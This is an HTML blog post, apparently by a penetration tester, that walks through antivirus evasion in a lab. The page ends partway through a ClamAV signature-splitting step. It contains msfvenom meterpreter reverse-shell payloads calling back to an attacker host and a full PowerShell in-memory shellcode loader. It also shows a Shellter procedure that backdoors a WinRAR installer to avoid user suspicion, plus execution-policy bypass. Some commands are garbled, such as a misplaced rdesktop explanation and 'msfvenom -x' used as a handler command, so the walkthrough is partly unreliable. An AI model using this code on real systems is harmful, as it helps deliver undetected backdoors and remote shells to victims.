@@ -1,0 +1,692 @@
+<!doctype html>
+<html lang="en-us">
+  <head>
+    <title>Case Studies - Antivirus Evasion // FMisi&#39;s security.log</title>
+    <link rel="shortcut icon" href="../favicon.ico" />
+    <meta charset="utf-8" />
+    <meta name="generator" content="Hugo 0.105.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="author" content="FMisi" />
+    <meta name="description" content="" />
+    <link rel="stylesheet" href="../../stiluslapom.css" />
+    <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Case Studies - Antivirus Evasion"/>
+
+    <meta property="og:title" content="Case Studies - Antivirus Evasion" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://fmisi.github.io/notes/0-info-gathering/" /><meta property="article:section" content="case-studies" />
+<meta property="article:published_time" content="2022-07-13T23:18:05+13:00" />
+<meta property="article:modified_time" content="2022-07-13T23:18:05+13:00" />
+
+
+
+  </head>
+  <body>
+    <header class="app-header">
+      <a href="https://fmisi.github.io/"><img class="app-header-avatar" src="../../avatar.jpg" alt="FMisi" /></a>
+      <span class="app-header-title">FMisi</span>
+      <nav class="app-header-menu">
+          <a class="app-header-menu-item" href="../../index.html">/root</a>
+             - 
+          
+          <a class="app-header-menu-item" href="../../htb/index.html">/htb</a>
+             - 
+          
+		  <a class="app-header-menu-item" href="../../case-studies/index.html">/case-studies</a>
+             - 
+		  
+          <a class="app-header-menu-item" href="../../notes/index.html">/notes</a>
+      </nav>
+      <p>FMisi is a penetration tester.</p></br>
+      <a style="font-size: smaller;" href="../../../privacy/index.html">Privacy Policy</a></br>
+    </header>
+    <main class="app-container">
+
+  <article class="post">
+    <header class="post-header">
+      <script data-name="BMC-Widget" data-cfasync="false" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="fmisi" data-description="Support me on Buy me a coffee!" data-message="" data-color="#40DCA5" data-position="Right" data-x_margin="18" data-y_margin="18"></script>
+      <script src="/js/crypto-js.min.js"></script>
+      <script src="/js/dice.js"></script>
+      <h1 class ="post-title">Case Studies - Antivirus Evasion</h1>
+      <div class="post-meta">
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-calendar">
+  <title>calendar</title>
+  <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line>
+</svg>
+          Aug 30, 2023
+        </div>
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-clock">
+  <title>clock</title>
+  <circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline>
+</svg>
+          50 min read
+        </div>
+      </div>
+    </header>
+<div class="post-content">
+<h3 id="intro">Intro</h3>
+In this blog post, we will delve into the intriguing world of antivirus evasion techniques, exploring the various ways in which malicious actors attempt to outmaneuver security software.<br/>From the ingenious obfuscation of malicious code to polymorphic malware that shape-shifts with each attack, we will uncover the dark arts that threat actors employ to bypass even the most resilient antivirus defenses.<br/>
+However, this blog post is not meant to serve as a guidebook for aspiring hackers; quite the contrary.<br/>Our primary focus will be to shine a light on these stealthy strategies so that both security professionals and ordinary users can better understand the threats they face.<br/>With knowledge comes power, and by comprehending the tactics, we can fortify our defenses and develop effective mitigation solutions to safeguard our digital realm.<br/>
+<br/>
+<h3 id="aebg">Background</h3>
+<img src="lab.png" width="75%" height="50%" alt="lab.png"><br/><br/>
+<b>The real time protection of the antivirus/antiviruses we test against is turned ON unless otherwise stated.<br/>
+Both machines have nc.exe installed.<br/>
+Both systems are x86 (32 bit) systems.<br/>
+Both systems have a somewhat priviledged "lab" user and an even higher priviledged "admin" user.</b>
+<br/>
+<h3 id="verybasicae_whatisa">What is Antivirus Software?</h3>
+Antivirus is a type of application designed to prevent, detect, and remove malicious software.<br/>
+It was originally designed to simply remove computer viruses.<br/>
+However, with the development of other types of malware, antivirus softwares now typicly include additional protections, such as firewalls, application scanners, and more.<br/>
+<br/>
+<h3 id="verybasicae_dm">Detection Methods</h3>
+There are multiple methods that antivirus manufacturers utilize to detect malicious software.<br/>
+The most common methods used are: signature-based detection, heuristic-based detection, and behavior-based detection.<br/><br/>
+<b>Signature-based detection</b>: Signature-based antivirus detection is mostly considered a blacklist technology. In other words,
+the filesystem is scanned for known malware signatures and if any are detected, the offending
+files are quarantined. This implies that, with correct tools, we can bypass antivirus software that
+relies on this detection method fairly easily. Specifically, we can bypass signature-based detection
+by simply changing or obfuscating the contents of a known malicious file in order to break the
+identifying byte sequence (or signature).<br/><br/>
+<b>Heuristic-Based Detection</b>: Heuristic-Based detection is a detection method that relies on various rules and algorithms to
+determine whether or not an action is considered malicious. This is often achieved by stepping
+through the instruction set of a binary file or by attempting to decompile and then analyze the
+source code. The idea is to look for various patterns and program calls (as opposed to simple.
+byte sequences) that are considered malicious.<br/><br/>
+<b>Behavior-Based Detection</b>: Behavior-Based detection dynamically analyzes the behavior of a binary file. This
+is often achieved by executing the file in question in an emulated environment, such as a small
+virtual machine, and looking for behaviors or actions that are considered malicious.<br/><br/>
+It is important to note that the majority of antivirus developers use a combination of these detection
+methods to achieve higher detection rates.<br/>
+<br/>
+<h3 id="verybasicae_em">Evasion Methods</h3>
+Generally speaking, antivirus evasion falls into two broad categories: on-disk and in-memory.<br/><b>On-disk evasion</b> focuses on modifying malicious files physically stored on disk in an attempt to evade
+AV detection.<br/>Given the maturity of AV file scanning, modern malware often attempts <b>in-memory
+evasion</b>, avoiding the disk entirely.<br/>
+<br/>
+<h4 id="verybasicae_od">On-disk Evasion</h4>
+To begin our discussion of evasion, we will first look at various techniques used to obfuscate files
+stored on a physical disk.<br/>
+<ul>
+<li><b>Packers</b>: Modern on-disk malware obfuscation can take many forms.<br/>One of the earliest ways of avoiding
+detection involved the use of packers.<br/> Given the high cost of disk space and slow network
+speeds during the early days of the Internet, packers were originally designed to simply reduce
+the size of an executable.<br/>Unlike modern "zip" compression techniques, packers generate an
+executable that is not only smaller, but is also functionally equivalent with a completely new
+binary structure.<br/>The resultant file has a new signature and as a result, can effectively bypass
+older and more simplistic AV scanners.<br/>Even though some modern malware uses a variation of
+this technique, the use of UPX and other popular packers alone is not sufficient for evasion of
+modern AV scanners.</li><br/>
+<li><b>Obfuscators</b>: Obfuscators reorganize and mutate code in a way that makes it more difficult to reverse-
+engineer.<br/>This includes replacing instructions with semantically equivalent ones, inserting
+irrelevant instructions or "dead code", splitting or reordering functions, and so on.<br/>Although
+primarily used by software developers to protect their intellectual property, this technique also can be
+effective against signature-based AV detection.</li><br/>
+<li><b>Crypters</b>: A crypter software cryptographically alters executable code, adding a decrypting stub that
+restores the original code upon execution.<br/>This decryption happens in-memory, leaving only the
+encrypted code on-disk. Encryption has become foundational in modern malware as one of the
+most effective AV evasion techniques.</li><br/>
+<li><b>Software Protectors</b>: Highly effective antivirus evasion requires a combination of all of the previous techniques in
+addition to other advanced ones, including anti-reversing, anti-debugging, virtual machine
+emulation detection, and so on.<br/>In most cases, software protectors were designed for legitimate
+purposes but can also be used to bypass AV detection.<br/>
+Most of these techniques may appear simple at a high-level but they are actually quite complex.<br/>
+Because of this, there are currently few actively-maintained free tools that provide acceptable
+antivirus evasion.<br/>Among commercially available tools, The Enigma Protector in particular can
+successfully be used to bypass antivirus products. However, it is not always the case.
+</li><br/>
+</ul>
+<h4 id="verybasicae_im">In-memory Evasion</h4>
+In-Memory Injections, also known as PE Injection is a popular technique used to bypass
+antivirus products. Rather than obfuscating a malicious binary, creating new sections, or
+changing existing permissions, this technique instead focuses on the manipulation of volatile
+memory.<br/>One of the main benefits of this technique is that it does not write any files to disk,
+which is one the main areas of focus for most antivirus products.<br/>
+There are several evasion techniques that do not write files to disk.<br/>
+I will cover in-memory injection using PowerShell in detail and
+cover the others too which rely on low level programming background in languages such as C/C++.</br></br>
+<ul>
+<li><b>Remote Process Memory Injection</b>: This technique attempts to inject the payload into another valid PE that is not malicious. The
+  most common method of doing this is by leveraging a set of Windows APIs.<br/>First, we would
+  use the OpenProcess function to obtain a valid HANDLE to a target process that we have
+  permissions to access.<br/>After obtaining the HANDLE, we would allocate memory in the context of
+  that process by calling a Windows API such as VirtualAllocEx.<br/>Once the memory has been
+  allocated in the remote process, we would copy the malicious payload to the newly allocated
+  memory using WriteProcessMemory.<br/>After the payload has been successfully copied, it is
+  usually executed in memory in a separate thread using the CreateRemoteThread API.<br/>
+  This sounds complex, but we will use a similar technique in the following example, using
+  PowerShell to do most of the heavy lifting and perform a very similar but simplified attack
+  targeting a local powershell.exe instance.</li><br/>
+<li><b>Reflective DLL Injection</b>: Unlike regular DLL injection, which implies loading a malicious DLL from disk using the
+  LoadLibrary API, this technique attempts to load a DLL stored by the attacker in the process
+  memory.
+  The main challenge of implementing this technique is that LoadLibrary does not support loading a
+  DLL from memory. Furthermore, the Windows operating system does not expose any APIs that can handle this either. Attackers who choose to use this technique must write their own version
+  of the API that does not rely on a disk-based DLL.</li><br/>
+<li><b>Process Hollowing</b>: When using process hollowing to bypass antivirus software, attackers first launch a non-
+  malicious process in a suspended state.<br/>Once launched, the image of the process is removed
+  from memory and replaced with a malicious executable image.<br/>Finally, the process is then
+  resumed and malicious code is executed instead of the legitimate process.</li><br/>
+<li><b>Inline hooking</b>: As the name suggests, this technique involves modifying memory and introducing a hook
+  (instructions that redirect the code execution) into a function to point the execution flow to our
+  malicious code.<br/>Upon executing our malicious code, the flow will return back to the modified
+  function and resume execution, appearing as if only the original code had executed.
+</li><br/>
+</ul>
+<h3 id="verybasicae_prace">AV Evasion: Practical Example</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span># msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.11.0.100 LPORT=4444 -f exe > binary.exe<br/>[...]<br/>#</span>
+</code></div>
+Here, -x changes default bandwidth performance behaviour for RDP5. By default only theming is enabled, and all other options are disabled (corresponding to modem (56 Kbps)). Setting experience to b[roadband] enables menu animations and full window dragging. Setting experience to l[an] will also enable the desktop wallpaper. Setting experience to m[odem] disables all (including themes). Experience can also be a hexidecimal number containing the flags.</br></br>
+Uploading the binary.exe file to <a href="https://www.virustotal.com/gui/home/upload">virustotal.com</a> we see that a lot of antivirus vendors detected the file as malicious.</br></br>
+<img src="vt.png" height="40%" width="75%" alt="vt.png"><br/><br/>
+VirusTotal is convenient but it generates a hash for each unique submission, which is then shared with all participating AV vendors.<br/>
+We will see that we can use <a href="https://antiscan.me">AntiScan.Me</a> instead.</br>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span># rdesktop 10.11.0.22 -u lab -p lab -g 1024x768 -x 0x80</span>
+</code></div>
+Here, -x changes default bandwidth performance behaviour for RDP5. By default only theming is enabled, and all other options are disabled (corresponding to modem (56 Kbps)). Setting experience to b[roadband] enables menu animations and full window dragging. Setting experience to l[an] will also enable the desktop wallpaper. Setting experience to m[odem] disables all (including themes). Experience can also be a hexidecimal number containing the flags.</br></br>
+We set up a netcat listener on the Windows target.<br/>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-batch" data-lang="batch"><span style="display:flex;"><span><span>&gt; nc -lvnp 4455 &gt; C:\Users\lab\Desktop\binary.exe</span>
+</code></div>
+We set up netcat on our Kali machine to send the binary.exe file - previously generated with msfvenom - to the Windows target.
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span># nc -w 3 10.11.0.22 4455 &lt; binary.exe</span>
+</code></div><br/>
+<h4 id="iwontgiveitanid">PowerShell In-Memory Injection</h4>
+Below, we see a basic template script that performs in-memory injection:
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps" data-lang="ps"><span style="display:flex;"><span><span>$code = '
+[DllImport("kernel32.dll")]
+public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint
+flAllocationType, uint flProtect);
+
+[DllImport("kernel32.dll")]
+public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize,
+IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+
+[DllImport("msvcrt.dll")]
+public static extern IntPtr memset(IntPtr dest, uint src, uint count);';
+
+$winFunc =
+Add-Type -memberDefinition $code -Name "Win32" -namespace Win32Functions -passthru;
+
+[Byte[]];
+[Byte[]]$sc = &lt;place your shellcode here&gt;;
+
+$size = 0x1000;
+
+if ($sc.Length -gt 0x1000) {$size = $sc.Length};
+
+$x = $winFunc::VirtualAlloc(0,$size,0x3000,0x40);
+
+for ($i=0;$i -le ($sc.Length-1);$i++) {$winFunc::memset([IntPtr]($x.ToInt32()+$i),
+$sc[$i], 1)};
+
+$winFunc::CreateThread(0,0,$x,0,0,0);for (;;) { Start-sleep 60 };</span>
+</code></div><br/>
+The script sets the size of the allocated memory block ($size) to 0x1000 (4096 bytes) if the shellcode length is greater than 4096 bytes. While this ensures that the memory allocation is sufficient to hold the shellcode, it doesn't take into account cases where the shellcode length is smaller than 4096 bytes. If the shellcode is smaller, there will be unused memory, which is not efficient. Instead, we can directly use the length of the shellcode to determine the size of the memory allocation:
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps" data-lang="ps"><span style="display:flex;"><span><span>$sc = &lt;place your shellcode here&gt;;<br/>$size = $sc.Length;</span></code></div>
+The script lacks error handling, which might lead to issues if, for example, the memory allocation fails or if the shellcode contains invalid characters for the memory operations.<br/>
+We can modify the template script to correct these issues, but it is not necessary as these are not critical issues and it will do the job anyway.<br/><br/>
+The script starts by importing VirtualAlloc428 and CreateThread429 from kernel32.dll as well as
+memset from msvcrt.dll. These functions will allow us to allocate memory, create an execution
+thread, and write arbitrary data to the allocated memory, respectively. Once again, notice that we
+are allocating the memory and executing a new thread in the current process (powershell.exe),
+rather than a remote one.<br/><br/>
+The script then allocates a block of memory using VirtualAlloc, takes each byte of the payload
+stored in the $sc byte array, and writes it to our newly allocated memory block using memset.<br/><br/>
+As a final step, our in-memory written payload is executed in a separate thread using
+CreateThread.<br/><br/>
+We generate a shellcode with msfvenom:<br/>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span># sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.11.0.100 LPORT=4444 -f powershell<br/>[...]<br/>[byte[]] $buf = 0xfc, 0xe8, 0x82, [...]</span>
+</code></div>
+Then copy the resulting output into the script.<br/>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps" data-lang="ps"><span style="display:flex;"><span><span>$code = '
+  [DllImport("kernel32.dll")]
+  public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint
+  flAllocationType, uint flProtect);
+  
+  [DllImport("kernel32.dll")]
+  public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize,
+  IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+  
+  [DllImport("msvcrt.dll")]
+  public static extern IntPtr memset(IntPtr dest, uint src, uint count);';
+  
+  $winFunc =
+  Add-Type -memberDefinition $code -Name "Win32" -namespace Win32Functions -passthru;
+  
+  [Byte[]];
+  [Byte[]]$sc = 0xfc, 0xe8, 0x82, [...];
+  
+  $size = 0x1000;
+  
+  if ($sc.Length -gt 0x1000) {$size = $sc.Length};
+  
+  $x = $winFunc::VirtualAlloc(0,$size,0x3000,0x40);
+  
+  for ($i=0;$i -le ($sc.Length-1);$i++) {$winFunc::memset([IntPtr]($x.ToInt32()+$i),
+  $sc[$i], 1)};
+  
+  $winFunc::CreateThread(0,0,$x,0,0,0);for (;;) { Start-sleep 60 };</span></code></div><br/>
+
+We save our script with as av_test.ps1.<br/>
+Uploading it to VirusTotal.com reveals that only 6 antivirus flag our script as malicious, and Avira is not one of them.<br/>
+Let's scan the file with Avira on the targeted Windows machine.<br/><br/>
+<img src="avirascanres.png" hegiht="80" width="70%" alt="avirascanres.png">
+<br/><br/>
+Nice! Our powershell script did not trigger any warnings.
+If we attempt to run our powershell script with the<br/>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps" data-lang="ps"><span style="display:flex;"><span><span>&gt; powershell .\av_test.ps1</span>
+</code></div>
+command, we notice that the execution policy prevents us from executing our script.<br/>
+This is because powershell execution policies are set on a per user, rather than a per system basis.<br/>
+We can: attempt to change the execution policy OR attempt to bypass the execution policy on a per script basis with the
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps" data-lang="ps"><span style="display:flex;"><span><span> -ExecutionPolicy Bypass</span>
+</code></div>
+flag.<br/><br/>
+Keep in mind that much like anything in Windows, the PowerShell Execution
+Policy settings can be dictated by one or more Active Directory GPOs. In those
+cases it may be necessary to look for additional bypass vectors.<br/><br/>
+Let's attempt to view and change the current policy for our user.<br/>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps" data-lang="ps"><span style="display:flex;"><span><span>&gt; Get-ExecutionPolicy -Scope CurrentUser<br/>Undefined<br/>&gt; Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser<br/>&gt; Get-ExecutionPolicy -Scope CurrentUser<br/>Unrestricted</span>
+</code></div>
+Before executing our script, we start a meterpreter handler on our Kali attack machine to interact with our shell.
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span># msfvenom -x "use exploit/multi/handler; set RHOST 10.11.0.22; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 10.11.0.100"  </span>
+</code></div>
+Typing in
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span>&gt; show options  </span>
+</code></div>
+we can see everything is alright and the LPORT is 4444.<br/>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span>&gt; exploit  </span>
+</code></div>
+Let's launch our powershell script on the targeted Windows machine!<br/>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps" data-lang="ps"><span style="display:flex;"><span><span>&gt; .\av_test.ps1</span>
+</code></div>
+The script executes without any problems...
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span><u>meterpreter</u> &gt; getuid  <br/>Server username: WIN10-x86\lab</span>
+</code></div>
+and we receive a meterpreter shell on our attack machine.<br/>
+Excellent!<br/>
+We have successfully evaded Avira's detection on our target.<br/>
+<h4 id="shellter">Shellter</h4>
+Shellter is a dynamic shellcode injection tool and one of the most popular free tools capable of
+bypassing antivirus software. It uses a number of novel and advanced techniques to essentially
+backdoor a valid and non-malicious executable file with a malicious shellcode payload.<br/>
+it essentially
+performs a thorough analysis of the target PE (portable executable) file and the execution paths. It then determines where
+it can inject our shellcode, without relying on traditional injection techniques that are easily caught
+by AV engines. Those include changing of PE file section permissions, creating new sections, and
+so on.
+Finally, Shellter attempts to use the existing PE Import Address Table (IAT) entries to locate
+functions that will be used for the memory allocation, transfer, and execution of our payload.<br/>
+Not to be confused with the Virtual Function Table (VFT).<br/>
+We need a legitimate software to which we can inject our malicious payload.<br/>
+WinRAR will be good for this purpose.<br/>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span># sudo apt install shellter && sudo apt install wine</span>
+</code></div>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span># sudo shellter</span>
+</code></div>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span> A  </span>
+</code></div>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span> /home/kali/winrar-x32-623.exe  </span>
+</code></div>
+As soon as Shellter finds a suitable place for our shellcode it will ask us if we want to enable stealth mode, which will try to restore the execution flow after executing our payload. We will enable this, allowing our winrar installation to complete normally, which could reduce user suspicion.<br/>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span> Y  </span>
+</code></div>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span>[...]<br/>[1] Meterpreter_Reverse_TCP [stager]<br/>[...]<br/> L</span>
+</code></div>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span> 1  </span>
+</code></div>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span>SET LHOST: 10.11.0.100  </span>
+</code></div>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span>SET LPORT: 4444  </span>
+</code></div>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span>[...]<br/>Injection: Verified!<br/>Press [Enter] to continue...  </span>
+</code></div>
+We configure a listener on our Kali machine to interact with the meterpreter payload and transfer our PE with netcat.
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span># msfvenom -x "use exploit/multi/handler; set RHOST 10.11.0.22; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 10.11.0.100; exploit"  </span>
+</code></div>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps" data-lang="ps"><span style="display:flex;"><span><span>&gt; nc.exe -lvnp 4455 &gt; C:\Users\lab\Dekstop\winrar-x32-623.exe  </span>
+</code></div>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps" data-lang="ps"><span style="display:flex;"><span><span># nc -lvnp 4455 &gt; C:\Users\lab\Dekstop\winrar-x32-623.exe  </span>
+</code></div>
+Let's scan our WinRAR with Avira.<br/><br/>
+<img src="avirascanres.png" hegiht="80" width="70%" alt="avirascanres.png">
+<br/><br/>
+Since Shellter obfuscates both the payload as well as the payload decoder before injecting them into the PE, the Avira scan runs cleanly.<br/>
+Once we execute the file, we are presented with the default WinRAR installation window.<br/>
+We install WinRAR.<br/>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span><u>meterpreter</u> &gt;<br/>[*] 10.11.0.22 - Meterpreter session 1 closed. Reason: Died</span>
+</code></div>
+Looking back at our handler shows that we
+successfully received a Meterpreter session but the session appears to die after the installation
+either finishes or is cancelled.<br/>
+This makes sense because the installer execution has completed and the process has been
+terminated.<br/>In order to overcome this problem, we can set up an AutoRunScript to migrate our
+Meterpreter to a separate process immediately after session creation.<br/>If we re-run the WinRAR
+setup file after this change to our listener instance, we should receive a different result.
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span>&gt; set AutoRunScript post/windows/manage/migrate<br/>AutoRunScript => post/windows/manage/migrate<br/><br/>&gt; exploit<br/>[...]<br/>[*] Spawning notepad.exe process to migrate to<br/>[+] Migrating to 4832<br/>[+] Successfully migrated to process 4832</span>
+</code></div>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span><u>meterpreter</u> &gt; getuid  <br/>Server username: WIN10-x86\lab</span>
+</code></div>
+After the migration completes, the session will remain active even after we complete the WinRAR
+installation process or cancel it.
+
+<!--END of very basic stuff-->>
+
+<h3 id="interav">Intermediate Antivirus Evasion</h3>
+To begin, let's discuss the process of bypassing antivirus signature detection.<br/><br/>
+<b>For this exercise, we must disable the heuristics-based scanning portion of the antivirus engine.
+In this section, we are going to rely on ClamAV for scanning, which is preinstalled on the targeted Windows 10 victim
+machine and has its heuristics engine disabled.</b><br/><br/>
+Before starting our analysis, we'll launch the Avira Free Antivirus GUI and open the Antivirus pane.
+In the new window, we'll click Real-Time Protection and switch it "off".<br/><br/>
+<img src="aviradisablerealtime.png" height="80%" width="75%" alt="aviradisablerealtime.png"><br/><br/>
+For this example, we'll generate a 32-bit Meterpreter executable and copy it to the C:\Tools folder
+on our Windows 10 victim machine. This will serve as our malicious binary.<br/>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span># sudo msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.100 LPORT=4444 -f exe &gt; ./met.exe</span>
+</code></div>
+Next, we'll open a PowerShell prompt with the -ExecutionPolicy Bypass argument, navigate to the C:\Tools<br/>
+directory, and import the Find-AVSignature script as follows:<br/>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps" data-lang="ps"><span style="display:flex;"><span><span>&gt; powershell -ExecutionPolicy Bypass<br/>&gt; cd C:\Tools<br/>&gt; Import-Module .\Find-AVSignature.ps1</span>
+</code></div>
+Let's use Find-AVSignature to split the met.exe file into intervals.<br/>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps" data-lang="ps"><span style="display:flex;"><span><span>&gt; Find-AVSignature -StartByte 0 -EndByte max -Interval 10000 -Path C:\Tools\met.exe -OutPath C:\Tools\avtest1 -Verbose -Force<br/><br/>[...]<br/>
+  VERBOSE: Byte 0 -> 0
+  VERBOSE: Byte 0 -> 10000
+  VERBOSE: Byte 0 -> 20000
+  VERBOSE: Byte 0 -> 30000
+  VERBOSE: Byte 0 -> 40000
+  VERBOSE: Byte 0 -> 50000
+  VERBOSE: Byte 0 -> 60000
+  VERBOSE: Byte 0 -> 70000
+  VERBOSE: Byte 0 -> 73801
+  Files written to disk. Flushing memory.
+  Completed!</span>
+</code></div>
+We'll open a new administrative PowerShell prompt and navigate to the C:\Program Files\ClamAV folder.<br/>
+From here, we'll launch the clamscan.exe executable, running the scan against the segments in<br/>
+the C:\Tools\avtest1 folder<br/>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps" data-lang="ps"><span style="display:flex;"><span><span>&gt; cd 'C:\Program Files\ClamAV\'<br/>&gt; .\clamscan.exe C:\Tools\avtest1
+C:\Tools\avtest1\met_0.bin: OK
+C:\Tools\avtest1\met_10000.bin: OK
+C:\Tools\avtest1\met_20000.bin: Win.Trojan.MSShellcode-7 FOUND
+C:\Tools\avtest1\met_30000.bin: Win.Trojan.MSShellcode-7 FOUND
